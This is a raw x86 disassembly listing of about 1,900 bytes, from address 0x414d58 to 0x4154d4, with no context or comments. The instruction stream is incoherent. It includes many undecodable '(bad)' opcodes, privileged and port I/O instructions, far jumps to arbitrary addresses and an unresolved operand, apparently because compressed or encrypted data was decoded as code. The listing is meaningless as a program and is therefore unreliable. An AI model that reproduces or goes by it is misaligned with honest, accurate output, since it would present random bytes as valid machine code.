  414d58:	sar    DWORD PTR [esi-0x6e976078],1
  414d5e:	mov    ds:0x538e8391,eax
  414d63:	mov    al,ds:0x2d49f5c0
  414d68:	xor    ah,BYTE PTR [eax]
  414d6a:	xlat   BYTE PTR ds:[ebx]
  414d6b:	out    dx,eax
  414d6c:	aas    
  414d6d:	sti    
  414d6e:	add    BYTE PTR [edi+ebx*4+0x3e],bh
  414d72:	idiv   DWORD PTR [edx-0x1d]
  414d75:	push   ds
  414d76:	test   DWORD PTR [eax-0x4b],esp
  414d79:	cmp    DWORD PTR [esp+esi*2+0x53],edx
  414d7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d7e:	rol    DWORD PTR [ebx+0x57],cl
  414d81:	popa   
  414d82:	cmp    eax,0xf4c013a5
  414d87:	sub    ch,BYTE PTR [edx-0x1949695f]
  414d8d:	pop    es
  414d8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d8f:	inc    esi
  414d90:	leave  
  414d91:	sahf   
  414d92:	fs pushf 
  414d94:	xchg   BYTE PTR [ecx],ah
  414d96:	iret   
  414d97:	cmp    eax,0x5083f1e6
  414d9c:	mov    dh,0xb3
  414d9e:	shr    BYTE PTR [esp+edx*1-0x7522f4ef],1
  414da5:	arpl   WORD PTR [ebx-0x48],bp
  414da8:	jae    0x414dc2
  414daa:	mov    cl,0xeb
  414dac:	pop    eax
  414dad:	push   edi
  414dae:	mov    dh,0x61
  414db0:	fwait
  414db1:	scas   eax,DWORD PTR es:[edi]
  414db2:	(bad)  
  414db3:	xchg   esi,eax
  414db4:	mov    bh,0x79
  414db6:	fisttp WORD PTR [ebx]
  414db8:	cli    
  414db9:	jmp    0x77675c3b
  414dbe:	stos   DWORD PTR es:[edi],eax
  414dbf:	xor    BYTE PTR [edi-0x59b2ba4c],al
  414dc5:	lods   al,BYTE PTR ds:[esi]
  414dc6:	sbb    BYTE PTR [edx-0xcf0a93e],ch
  414dcc:	sub    edx,eax
  414dce:	sub    al,0x4e
  414dd0:	push   ebp
  414dd1:	in     eax,dx
  414dd2:	adc    dl,BYTE PTR [eax+0x79]
  414dd5:	pop    edx
  414dd6:	or     BYTE PTR [esi],ah
  414dd8:	pop    eax
  414dd9:	push   es
  414dda:	push   ebx
  414ddb:	in     al,dx
  414ddc:	mov    ds:0x71c46dc7,al
  414de1:	mov    dh,0xe1
  414de3:	inc    ecx
  414de4:	jne    0x414d9b
  414de6:	mov    eax,ds:0x603c1461
  414deb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414dec:	fld    QWORD PTR [ebx-0x21982f5d]
  414df2:	dec    ebp
  414df3:	aam    0xc4
  414df5:	jge    0x414e3b
  414df7:	jae    0x414e4e
  414df9:	dec    esp
  414dfa:	repnz sbb BYTE PTR [edi+0xd446743],ah
  414e01:	xchg   ebx,eax
  414e02:	out    dx,eax
  414e03:	stc    
  414e04:	push   ds
  414e05:	ss xchg ecx,eax
  414e07:	adc    eax,0xfe59c321
  414e0c:	xor    al,0xff
  414e0e:	sahf   
  414e0f:	lea    esi,[ebx]
  414e11:	lods   al,BYTE PTR ds:[esi]
  414e12:	(bad)  
  414e13:	test   al,0x12
  414e15:	shl    bl,0xb6
  414e18:	clc    
  414e19:	adc    eax,0x73d38f73
  414e1e:	adc    BYTE PTR [eax+0x3ee59e3b],bh
  414e24:	cmp    eax,0x1869932c
  414e29:	shl    eax,1
  414e2b:	mov    ds:0xd4986811,eax
  414e30:	in     eax,0x5f
  414e32:	ret    0xff6d
  414e35:	mov    bl,0xc4
  414e37:	add    bl,BYTE PTR [edi]
  414e39:	imul   eax,DWORD PTR [ebp+0x686f1a32],0x9f4f1493
  414e43:	outs   dx,BYTE PTR ds:[esi]
  414e44:	sbb    eax,0x61a5b206
  414e49:	call   0xf6cd87d1
  414e4e:	out    0xf,al
  414e50:	into   
  414e51:	aam    0xbf
  414e53:	pop    es
  414e54:	sti    
  414e55:	inc    edi
  414e56:	and    BYTE PTR [edx+0x1a],dl
  414e59:	sub    edi,ecx
  414e5b:	push   eax
  414e5c:	add    al,0xb
  414e5e:	sahf   
  414e5f:	sahf   
  414e60:	and    ah,dl
  414e62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e63:	aam    0xa
  414e65:	icebp  
  414e66:	(bad)  
  414e67:	xchg   edi,eax
  414e68:	push   ebp
  414e69:	sbb    eax,0x2ffe0a2e
  414e6e:	xchg   dx,ax
  414e70:	push   0x3e
  414e72:	mov    ds:0xb5b51025,eax
  414e77:	xchg   edx,eax
  414e78:	mov    bh,0xd
  414e7a:	daa    
  414e7b:	pop    esp
  414e7c:	add    BYTE PTR [esi-0x58b56431],al
  414e82:	jmp    0x414ef1
  414e84:	cmc    
  414e85:	jno    0x414e37
  414e87:	dec    edi
  414e88:	xchg   esi,eax
  414e89:	test   BYTE PTR [ecx+0x72],0x71
  414e8d:	repz ret 
  414e8f:	jnp    0x414f0c
  414e91:	pusha  
  414e92:	sub    BYTE PTR [esi+0xa5fe61],dl
  414e98:	mov    ebx,edi
  414e9a:	adc    bh,0x81
  414e9d:	add    cl,BYTE PTR [ecx]
  414e9f:	std    
  414ea0:	inc    edx
  414ea1:	test   eax,0xdff9e685
  414ea6:	fistp  WORD PTR [edi-0x8c2e9b7]
  414eac:	stc    
  414ead:	in     eax,0xac
  414eaf:	sub    eax,0x7e82b9ff
  414eb4:	sbb    eax,0xa258ba63
  414eb9:	dec    ebx
  414eba:	push   esi
  414ebb:	clc    
  414ebc:	xchg   ebx,eax
  414ebd:	xchg   ah,ch
  414ebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ec0:	rol    BYTE PTR [ecx-0x950c],cl
  414ec6:	leave  
  414ec7:	inc    eax
  414ec8:	fld    TBYTE PTR [ebx-0x4499800f]
  414ece:	mov    dh,0x5b
  414ed0:	inc    esi
  414ed1:	dec    ebp
  414ed2:	ror    DWORD PTR [ebp+0x57779cde],1
  414ed8:	dec    eax
  414ed9:	lods   al,BYTE PTR ds:[esi]
  414eda:	ds adc bh,bh
  414edd:	push   ecx
  414ede:	adc    edi,DWORD PTR [esi-0x2d]
  414ee1:	aam    0x62
  414ee3:	and    al,0x64
  414ee5:	into   
  414ee6:	xor    cl,BYTE PTR [edx-0x4d]
  414ee9:	(bad)  
  414eeb:	test   eax,0xd46a4b50
  414ef0:	nop
  414ef1:	xor    dl,BYTE PTR [ebx+edx*1]
  414ef4:	or     edi,DWORD PTR [eax]
  414ef6:	or     eax,0x7940bb02
  414efb:	or     DWORD PTR [ecx],esi
  414efd:	push   ecx
  414efe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414eff:	hlt    
  414f00:	and    BYTE PTR [ebx],ch
  414f02:	push   bp
  414f04:	sub    BYTE PTR [esi],cl
  414f06:	(bad)  
  414f07:	fldenv [esi]
  414f09:	rcr    BYTE PTR [esi],0x51
  414f0c:	pop    esi
  414f0d:	in     al,dx
  414f0e:	test   BYTE PTR [eax],0xdb
  414f11:	out    dx,eax
  414f12:	out    dx,eax
  414f13:	mov    eax,es
  414f15:	inc    ebp
  414f16:	xlat   BYTE PTR ds:[ebx]
  414f17:	mov    ah,BYTE PTR [edx+0x3e41db02]
  414f1d:	mov    ah,0xed
  414f1f:	ins    BYTE PTR es:[edi],dx
  414f20:	cmp    eax,0x2a02d6b0
  414f25:	lods   al,BYTE PTR ds:[esi]
  414f26:	dec    ebp
  414f27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f28:	loope  0x414f9d
  414f2a:	js     0x414eed
  414f2c:	pop    ss
  414f2d:	outs   dx,BYTE PTR ds:[esi]
  414f2e:	les    esp,FWORD PTR [esi+0x632255c8]
  414f34:	jnp    0x414ebe
  414f36:	popf   
  414f37:	and    ch,ch
  414f39:	retf   
  414f3a:	rol    edx,cl
  414f3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f3d:	sub    DWORD PTR [ecx-0x1c],0xffffffef
  414f41:	stos   BYTE PTR es:[edi],al
  414f42:	push   esi
  414f43:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  414f45:	pop    esp
  414f46:	daa    
  414f47:	xchg   edx,eax
  414f48:	out    0xbe,al
  414f4a:	jno    0x414efd
  414f4c:	mov    al,ds:0xeda3be2e
  414f51:	push   ebp
  414f52:	xchg   edi,eax
  414f53:	sar    DWORD PTR [edx],cl
  414f55:	pop    ds
  414f56:	fbld   TBYTE PTR ds:0x2d4d3da0
  414f5c:	loopne 0x414f27
  414f5e:	loopne 0x414f11
  414f60:	test   DWORD PTR [ebx],edx
  414f62:	xchg   BYTE PTR [edi+edi*2],bh
  414f65:	js     0x414f0c
  414f67:	popa   
  414f68:	retf   
  414f69:	js     0x414ef3
  414f6b:	push   edx
  414f6c:	dec    ebp
  414f6d:	popa   
  414f6e:	call   0x9e20e0e9
  414f73:	add    cl,BYTE PTR [edx]
  414f75:	adc    eax,0x5e1a9fe
  414f7a:	or     al,0x9
  414f7c:	add    eax,esi
  414f7e:	and    eax,0xecbe3394
  414f83:	mov    WORD PTR [eax-0x7c],?
  414f86:	loopne 0x414f8e
  414f88:	jno    0x414f5c
  414f8a:	js     0x414fd9
  414f8c:	hlt    
  414f8d:	jnp    0x414f26
  414f8f:	ss in  al,dx
  414f91:	into   
  414f92:	call   0x1134:0x7e298d6
  414f99:	inc    esi
  414f9a:	loopne 0x414f7f
  414f9c:	adc    DWORD PTR [ebx],edi
  414f9e:	imul   edx,DWORD PTR [esi+0x77],0x4c428198
  414fa5:	dec    edx
  414fa6:	sub    al,BYTE PTR [ecx]
  414fa8:	cmp    al,0x78
  414faa:	dec    esi
  414fab:	stc    
  414fac:	fs out 0xd8,eax
  414faf:	mov    esp,0x788d5aff
  414fb4:	or     BYTE PTR [edx-0xbad3818],bh
  414fba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fbb:	jbe    0x414fc5
  414fbd:	fcmovnb st,st(4)
  414fbf:	pop    edi
  414fc0:	jnp    0x415035
  414fc2:	arpl   WORD PTR [ebp+0x59a7a4c],ax
  414fc8:	sub    bh,BYTE PTR [ebx+eax*2-0x58]
  414fcc:	and    al,BYTE PTR [eax+0x73]
  414fcf:	int    0xb8
  414fd1:	inc    esp
  414fd2:	mov    eax,ds:0xd5a99b4a
  414fd7:	fisub  WORD PTR [ebx]
  414fd9:	inc    esi
  414fda:	xor    BYTE PTR [edx],cl
  414fdc:	fnstsw WORD PTR [ebx+0x70a9752d]
  414fe2:	pusha  
  414fe3:	leave  
  414fe4:	mov    ebp,0x1a82374d
  414fe9:	jge    0x414fa2
  414feb:	add    DWORD PTR [esi],esp
  414fed:	inc    ebx
  414fee:	xor    DWORD PTR ds:0xbfc91ab4,0xa5c629f5
  414ff8:	sub    al,0xb5
  414ffa:	pop    ebx
  414ffb:	pop    ebp
  414ffc:	pop    esp
  414ffd:	adc    BYTE PTR [edx+0x1b46eebd],0xd8
  415004:	aad    0x4f
  415006:	xchg   BYTE PTR [eax+0x47],ah
  415009:	hlt    
  41500a:	out    0xe9,al
  41500c:	push   es
  41500d:	js     0x415012
  41500f:	jne    0x41507d
  415011:	stc    
  415012:	int    0x3a
  415014:	dec    ecx
  415015:	mov    al,ds:0xa5cdbe68
  41501a:	xor    bh,BYTE PTR [edi+0xac580ae]
  415020:	mov    edx,0xc2a266fa
  415025:	neg    BYTE PTR [ebx+0x5e]
  415028:	xchg   BYTE PTR [eax-0x7db13154],cl
  41502e:	xor    DWORD PTR gs:[edx-0x6a],eax
  415032:	add    al,0xbe
  415034:	test   eax,0x7102c531
  415039:	jmp    0x22369030
  41503e:	stos   BYTE PTR es:[edi],al
  41503f:	adc    ecx,DWORD PTR [esi+0x77]
  415042:	jns    0x4150b7
  415044:	pop    ecx
  415045:	and    cl,BYTE PTR [edx-0x57]
  415048:	nop
  415049:	push   cs
  41504a:	push   ecx
  41504b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41504c:	sbb    edi,DWORD PTR [esi-0x8922228]
  415052:	push   esi
  415053:	in     al,dx
  415054:	cs scas al,BYTE PTR es:[edi]
  415056:	pop    ecx
  415057:	sub    esp,0x903248e8
  41505d:	cmp    al,bl
  41505f:	mov    dl,0x5e
  415061:	enter  0xc981,0xd1
  415065:	sbb    ecx,DWORD PTR [edx]
  415067:	xchg   esp,eax
  415068:	cmp    DWORD PTR [esi],0xea317609
  41506e:	mov    ebp,0xd0990730
  415073:	adc    al,bh
  415075:	aam    0x81
  415077:	adc    DWORD PTR [ebp+0x7508361c],edi
  41507d:	ins    BYTE PTR es:[edi],dx
  41507e:	xor    ebx,0xffffffdc
  415081:	(bad)  
  415082:	out    0x53,eax
  415084:	ret    0xb66f
  415087:	xor    eax,0x860ce5d7
  41508c:	leave  
  41508d:	xchg   esi,eax
  41508e:	ror    DWORD PTR [ebx],1
  415090:	jno    0x41506b
  415092:	inc    eax
  415093:	dec    eax
  415094:	aam    0x3d
  415096:	test   al,0xdc
  415098:	jp     0x415029
  41509a:	push   0xffffff97
  41509c:	out    0x8d,eax
  41509e:	sahf   
  41509f:	add    ebp,esp
  4150a1:	popa   
  4150a2:	push   cs
  4150a3:	xchg   edx,eax
  4150a4:	mov    al,ds:0x7dfbff60
  4150a9:	jne    0x415086
  4150ab:	jmp    0x7886e338
  4150b0:	dec    edx
  4150b1:	fst    QWORD PTR [ecx]
  4150b3:	sti    
  4150b4:	adc    eax,0xef84b641
  4150b9:	mov    esp,DWORD PTR [ebp+0x6d]
  4150bc:	pop    esi
  4150bd:	mov    DWORD PTR [esi+0x4ced9b79],ecx
  4150c3:	and    dh,BYTE PTR [ecx+0x4a]
  4150c6:	mov    WORD PTR [edx+0x6ff7b3de],es
  4150cc:	fimul  DWORD PTR [edx+0x63]
  4150cf:	push   cs
  4150d0:	xchg   esi,eax
  4150d1:	cmp    eax,0x6e73f696
  4150d6:	cmp    DWORD PTR [ecx-0x3ba11c59],esi
  4150dc:	ds xchg edi,eax
  4150de:	pop    ebx
  4150df:	push   0xffffff89
  4150e1:	push   ecx
  4150e2:	aam    0x1c
  4150e4:	dec    esi
  4150e5:	in     al,dx
  4150e6:	dec    edx
  4150e7:	mov    al,0xec
  4150e9:	call   0x3c71fe2b
  4150ee:	xor    bh,BYTE PTR [ecx+0x69]
  4150f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150f2:	repnz sub eax,0x1403abe8
  4150f8:	fs addr16 mov ah,0xb4
  4150fc:	gs adc eax,0xf225e354
  415102:	in     eax,0xad
  415104:	pop    esp
  415105:	jecxz  0x4150f9
  415107:	sub    DWORD PTR [edi+esi*4],ebp
  41510a:	push   ecx
  41510b:	inc    edx
  41510c:	in     eax,0x15
  41510e:	and    dh,BYTE PTR [edi]
  415110:	cmp    ebx,DWORD PTR [eax+0x5d]
  415113:	repz jle 0x41518d
  415116:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415117:	fucomp st(1)
  415119:	aam    0x90
  41511b:	cmc    
  41511c:	data16 add dl,BYTE PTR [esi]
  41511f:	(bad)  [ebx+ecx*8]
  415122:	jg     0x415120
  415124:	xor    al,0xfa
  415126:	and    eax,0xf9a9ea38
  41512b:	inc    eax
  41512c:	xor    eax,0xb8838757
  415131:	jge    0x415198
  415133:	jl     0x4150ee
  415135:	bound  edx,QWORD PTR [ebp+0x4fe9124e]
  41513b:	inc    edi
  41513c:	cmp    BYTE PTR [esi-0x1a],cl
  41513f:	and    ah,0x1
  415142:	jmp    0x415107
  415144:	inc    eax
  415145:	je     0x4151b7
  415147:	pop    ebp
  415148:	js     0x4150ca
  41514a:	jno    0x415109
  41514c:	je     0x41516f
  41514e:	cmp    eax,0x847448f9
  415153:	mov    BYTE PTR [esp+ebx*1+0x5b],dl
  415157:	pavgb  mm7,QWORD PTR [edi+0x3a57d631]
  41515e:	fcomp  QWORD PTR [edx-0x3f70121d]
  415164:	js     0x4151dc
  415166:	call   0x23d6fbfb
  41516b:	retf   0xaca1
  41516e:	clc    
  41516f:	mov    ebx,0x124f7676
  415174:	mov    ecx,esi
  415176:	adc    DWORD PTR [edi+0x35],ebx
  415179:	xlat   BYTE PTR ds:[ebx]
  41517a:	adc    edi,0xffffffa5
  41517d:	loopne 0x4151a0
  41517f:	mul    DWORD PTR [edi+0x35]
  415182:	xor    DWORD PTR [ecx+0x68],edi
  415185:	adc    eax,0x4fac1bcc
  41518a:	and    al,0x36
  41518c:	add    edx,0xfffffff2
  41518f:	push   ebp
  415190:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415191:	add    cl,bl
  415193:	out    dx,eax
  415194:	mov    WORD PTR [edi-0x51],gs
  415197:	add    BYTE PTR [edx],bl
  415199:	mov    eax,0xf8008a11
  41519e:	rcl    BYTE PTR [edi-0x61ae02a7],1
  4151a4:	pop    ebx
  4151a5:	mov    ecx,0x54f2a66f
  4151aa:	jae    0x415164
  4151ac:	sbb    al,0x12
  4151ae:	(bad)  
  4151af:	loope  0x41522b
  4151b1:	ins    BYTE PTR es:[edi],dx
  4151b2:	xchg   edx,eax
  4151b4:	sub    BYTE PTR [esi],dl
  4151b6:	test   eax,0xa25169b3
  4151bb:	dec    ecx
  4151bc:	lds    ecx,FWORD PTR [esi]
  4151be:	cmp    dl,BYTE PTR [ecx-0x393a48db]
  4151c4:	test   BYTE PTR es:[edi+0x27e78c3a],al
  4151cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151cc:	jg     0x4151f3
  4151ce:	(bad)  
  4151cf:	mov    BYTE PTR [ebp-0x39],bh
  4151d2:	cmc    
  4151d3:	pop    es
  4151d4:	out    dx,eax
  4151d5:	les    edx,FWORD PTR [eax-0x55]
  4151d8:	pop    edx
  4151d9:	sub    BYTE PTR [edx+ebp*8+0x54],bh
  4151dd:	shr    DWORD PTR [ebx+0x522d2af0],1
  4151e3:	(bad)  
  4151e4:	sub    al,0x32
  4151e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151e7:	fdiv   DWORD PTR [ebp-0x2d]
  4151ea:	push   cs
  4151eb:	add    BYTE PTR [edi-0x28],dl
  4151ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151ef:	fst    DWORD PTR [ebx+0x47]
  4151f2:	addr16 mov eax,0x220279e9
  4151f8:	rol    BYTE PTR [di],cl
  4151fb:	pop    edx
  4151fc:	mov    edi,DWORD PTR [esi]
  4151fe:	dec    edx
  4151ff:	ret    0xca50
  415202:	dec    ebp
  415203:	mov    ah,0xe6
  415205:	test   BYTE PTR [bp+0x6c],dh
  415209:	mov    esp,0xaf569dff
  41520e:	iret   
  41520f:	xchg   esi,eax
  415210:	mov    bl,0x37
  415212:	jp     0x4151ce
  415214:	and    al,0x74
  415216:	mov    dl,0x20
  415218:	loope  0x4151a9
  41521a:	hlt    
  41521b:	pop    eax
  41521c:	jnp    0x41525e
  41521e:	in     eax,dx
  41521f:	xor    al,0x4b
  415221:	mov    eax,0x33662583
  415226:	add    al,0x4
  415228:	(bad)  
  415229:	xchg   esi,eax
  41522a:	int    0x28
  41522c:	mov    BYTE PTR [eax+0x1],ah
  41522f:	dec    ecx
  415230:	mov    bh,0x92
  415232:	jae    0x415216
  415234:	fwait
  415235:	popa   
  415236:	test   ah,bl
  415238:	sub    BYTE PTR [ecx+0x1a6931dd],ah
  41523e:	hlt    
  41523f:	ret    0xa8db
  415242:	mov    ebp,0x377a8875
  415247:	jge    0x415293
  415249:	or     ah,BYTE PTR [ebx]
  41524b:	inc    esi
  41524c:	dec    ebp
  41524d:	test   DWORD PTR [esi+0x5d],eax
  415250:	cmc    
  415251:	push   esp
  415252:	fist   DWORD PTR [ebx+0x74]
  415255:	push   es
  415256:	and    BYTE PTR [ebp+esi*4-0x5a0bf497],bl
  41525d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41525e:	(bad)  
  41525f:	stos   BYTE PTR es:[edi],al
  415260:	cmp    eax,0xa2d519ec
  415265:	xchg   DWORD PTR [ebp+0x3b43b2a4],edi
  41526b:	wrmsr  
  41526d:	fnstcw WORD PTR [ecx]
  41526f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415270:	out    0x89,al
  415272:	dec    eax
  415273:	pop    edx
  415274:	adc    al,0xf1
  415276:	sbb    ch,BYTE PTR [ebx]
  415278:	or     DWORD PTR [ecx-0x5da551a9],eax
  41527e:	call   0x1898:0xd16ad5c3
  415285:	or     al,0xb7
  415287:	adc    bl,BYTE PTR [eax-0x3aa84649]
  41528d:	out    0x52,eax
  41528f:	les    esi,FWORD PTR [ecx-0x46c2f053]
  415295:	xor    dl,BYTE PTR [ecx-0x4c6374ad]
  41529b:	ds daa 
  41529d:	push   ebp
  41529e:	inc    esp
  41529f:	stc    
  4152a0:	test   edx,edi
  4152a2:	(bad)  
  4152a3:	inc    DWORD PTR [esi+0x52]
  4152a6:	outs   dx,BYTE PTR ds:[esi]
  4152a7:	jbe    0x4152ec
  4152a9:	fdiv   DWORD PTR [eax]
  4152ab:	mov    ebx,0xfe0ef61
  4152b0:	mov    cl,0x59
  4152b2:	ror    DWORD PTR [eax-0x55dc45fa],0xba
  4152b9:	push   ss
  4152ba:	push   esp
  4152bb:	add    BYTE PTR [ebp+0xb],0xce
  4152bf:	inc    ebp
  4152c0:	loope  0x41525a
  4152c2:	lock sbb ah,ah
  4152c5:	mov    eax,0x94cedb44
  4152ca:	or     ebx,esp
  4152cc:	nop
  4152cd:	sub    dl,dl
  4152cf:	bound  ebp,QWORD PTR [edx+0x59e9652d]
  4152d5:	daa    
  4152d6:	(bad)  
  4152d7:	cld    
  4152d8:	pop    ss
  4152d9:	test   BYTE PTR [esi+0x5e111571],ch
  4152df:	xchg   esi,eax
  4152e0:	mov    edx,edx
  4152e2:	cdq    
  4152e3:	pop    ebp
  4152e4:	outs   dx,DWORD PTR ds:[esi]
  4152e5:	inc    edi
  4152e6:	add    cl,BYTE PTR [ecx-0x63a92ca9]
  4152ec:	mov    dl,0x40
  4152ee:	cmp    ch,BYTE PTR [edx-0x2a34f722]
  4152f4:	xor    edx,ebp
  4152f6:	inc    edi
  4152f7:	pop    ss
  4152f8:	aas    
  4152f9:	sub    bh,ch
  4152fb:	push   0xe9a00337
  415300:	aam    0x44
  415302:	jecxz  0x415383
  415304:	inc    ecx
  415305:	adc    ah,BYTE PTR [ecx+ebp*8-0x7a6dca29]
  41530c:	sahf   
  41530d:	stc    
  41530e:	xchg   DWORD PTR [esi],ebx
  415310:	int3   
  415311:	bound  ecx,QWORD PTR [ebx-0x47e378f5]
  415317:	jae    0x415387
  415319:	lahf   
  41531a:	leave  
  41531b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41531c:	fs xchg edi,eax
  41531e:	sbb    BYTE PTR [ebx-0x62],bl
  415321:	xchg   esi,eax
  415322:	cmp    al,0xfd
  415324:	jbe    0x41534f
  415326:	mov    al,0xdc
  415328:	hlt    
  415329:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41532a:	adc    eax,0x81fa148d
  41532f:	or     cl,BYTE PTR ds:0xb8be673d
  415335:	loopne 0x4153b5
  415337:	lahf   
  415338:	xchg   dh,dl
  41533a:	cmp    al,0xe9
  41533c:	ja     0x41530f
  41533e:	pop    ecx
  41533f:	das    
  415340:	sbb    DWORD PTR [edx],esi
  415342:	mov    ah,0x76
  415344:	out    dx,al
  415345:	dec    eax
  415346:	jae    0x41538c
  415348:	ins    BYTE PTR es:[edi],dx
  415349:	push   ss
  41534a:	sar    DWORD PTR [edi+0x4dc31534],1
  415350:	adc    DWORD PTR [eax+0x2f],esp
  415353:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415354:	mov    al,ds:0xdfe743f7
  415359:	sub    bh,bl
  41535b:	jb     0x4152ea
  41535d:	sub    al,0xe2
  41535f:	(bad)  
  415360:	icebp  
  415361:	js     0x415307
  415363:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415364:	js     0x415350
  415366:	jmp    0x41531d
  415368:	std    
  415369:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41536a:	loopne 0x41539c
  41536c:	pop    es
  41536d:	xchg   ecx,eax
  41536e:	les    edi,FWORD PTR [esi]
  415370:	sbb    BYTE PTR [edi],0x60
  415373:	lods   eax,DWORD PTR ds:[esi]
  415374:	into   
  415375:	fnstcw WORD PTR [esi]
  415377:	cli    
  415378:	repz xchg edi,eax
  41537a:	or     al,0x74
  41537c:	jns    0x4153d7
  41537e:	(bad)  
  41537f:	fldenv [eax]
  415381:	xor    eax,0x8d66def0
  415386:	jns    0x415399
  415388:	fisubr DWORD PTR gs:[edi]
  41538b:	pop    eax
  41538c:	or     eax,0x69f746d
  415391:	and    ebx,eax
  415393:	les    edx,FWORD PTR [edi]
  415395:	(bad)  
  415396:	ror    BYTE PTR [ebx+edi*4+0x57],cl
  41539a:	mov    DWORD PTR [ebp+ecx*1-0x4d568bc5],esi
  4153a1:	sahf   
  4153a2:	inc    esp
  4153a3:	pusha  
  4153a4:	call   0x859bb52f
  4153a9:	dec    esi
  4153aa:	hlt    
  4153ab:	stos   DWORD PTR es:[edi],eax
  4153ac:	fwait
  4153ad:	pop    ebp
  4153ae:	mov    eax,ds:0x1c635984
  4153b3:	adc    ah,cl
  4153b5:	icebp  
  4153b6:	std    
  4153b7:	push   ecx
  4153b8:	inc    edx
  4153b9:	das    
  4153ba:	sub    eax,0x1d502e22
  4153bf:	push   ds
  4153c0:	mov    DWORD PTR [esi],0xa6d843b2
  4153c6:	in     al,dx
  4153c7:	sbb    al,0x9b
  4153c9:	fimul  WORD PTR [eax-0x79]
  4153cc:	xchg   edx,eax
  4153cd:	dec    ecx
  4153ce:	adc    DWORD PTR [eax+0x75],ebp
  4153d1:	pop    esp
  4153d2:	fmul   QWORD PTR es:[ebx]
  4153d5:	xchg   esp,eax
  4153d6:	daa    
  4153d7:	aaa    
  4153d8:	cli    
  4153d9:	adc    ebx,ebx
  4153db:	sbb    eax,0xdfa79d4f
  4153e0:	daa    
  4153e1:	into   
  4153e2:	push   eax
  4153e3:	mov    eax,DWORD PTR [edi+0x17b635df]
  4153e9:	push   0xffffffb5
  4153eb:	jno    0x4153a8
  4153ed:	sub    ch,bh
  4153ef:	xchg   edi,eax
  4153f0:	test   al,0x8d
  4153f2:	ret    0xe84b
  4153f5:	push   ebp
  4153f6:	sbb    DWORD PTR [esi+0x35],esp
  4153f9:	mov    eax,0x79f990fb
  4153fe:	jge    0x4153df
  415400:	cmp    dl,BYTE PTR [ebx+0xa]
  415403:	stos   DWORD PTR es:[edi],eax
  415404:	push   0x4eaaea02
  415409:	sub    BYTE PTR [esi],al
  41540b:	or     al,0x15
  41540d:	ret    0xf132
  415410:	sbb    eax,0xb9d0fdb
  415415:	loopne 0x4153b7
  415417:	fwait
  415418:	xor    ebp,esp
  41541a:	out    dx,al
  41541b:	mov    edi,0x51c88468
  415420:	jg     0x41541c
  415422:	test   BYTE PTR [esp+esi*4+0x2f],ch
  415426:	mov    ecx,0xf08aa5a9
  41542b:	int    0x6a
  41542d:	pop    edx
  41542e:	pop    ss
  41542f:	(bad)  
  415430:	popf   
  415431:	mov    DWORD PTR [ebx+0x7a],esp
  415434:	push   edi
  415435:	add    BYTE PTR [esi],cl
  415437:	retf   
  415438:	rcr    DWORD PTR [ecx],1
  41543a:	sbb    al,0x97
  41543c:	sbb    DWORD PTR ds:0xe124f098,eax
  415442:	(bad)  
  415443:	lods   eax,DWORD PTR ds:[esi]
  415444:	mov    ch,0xd7
  415446:	jae    0x415406
  415448:	dec    BYTE PTR [ebp+esi*4-0x115c536f]
  41544f:	icebp  
  415450:	fldcw  WORD PTR [eax]
  415452:	adc    ch,bh
  415454:	ror    DWORD PTR [esi],cl
  415456:	aad    0x64
  415458:	xor    cl,dl
  41545a:	or     eax,0xc838d1e6
  41545f:	scas   al,BYTE PTR es:[edi]
  415460:	mov    dl,ah
  415462:	add    DWORD PTR [ebp+0x18fad4a3],0x441bcb8
  41546c:	sub    BYTE PTR [ecx+edx*1+0x79cd814c],bl
  415473:	inc    ebx
  415474:	xor    BYTE PTR [edx-0x5],cl
  415477:	add    esi,DWORD PTR [eax+ebp*8-0x78aa2ea2]
  41547e:	mov    WORD PTR [esp+ebp*2-0x62],ds
  415482:	stos   DWORD PTR es:[edi],eax
  415483:	pop    ss
  415484:	test   BYTE PTR [esi],ah
  415486:	push   0x510d04d8
  41548b:	jbe    0x415447
  41548d:	ret    
  41548e:	scas   al,BYTE PTR es:[edi]
  41548f:	add    al,0xcf
  415491:	and    BYTE PTR [eax+0x7e],0xc9
  415495:	jmp    0xeec4:0x543dacd
  41549c:	push   ss
  41549d:	stos   DWORD PTR es:[edi],eax
  41549e:	push   esi
  41549f:	sbb    BYTE PTR [edi+ebp*8],dl
  4154a2:	call   0xc307d92e
  4154a7:	cmp    DWORD PTR [edi-0x69],eax
  4154aa:	fdiv   DWORD PTR [eax+edx*4]
  4154ad:	pop    edx
  4154ae:	xor    DWORD PTR [eax],ecx
  4154b0:	out    0xa7,eax
  4154b2:	ds and al,0xe4
  4154b5:	inc    esi
  4154b6:	push   cs
  4154b7:	fild   DWORD PTR [ebp*1+0x1ad9d69]
  4154be:	pop    es
  4154bf:	adc    BYTE PTR [edi+0xf033a57],dl
  4154c5:	stos   BYTE PTR es:[edi],al
  4154c6:	into   
  4154c7:	cmp    edi,DWORD PTR gs:[ecx]
  4154ca:	nop    ecx
  4154cd:	mov    ecx,0xba9afbbe
  4154d2:	mov    dl,0x2f
  4154d4:	fist   WORD PTR [ebx-0x8319d1a]
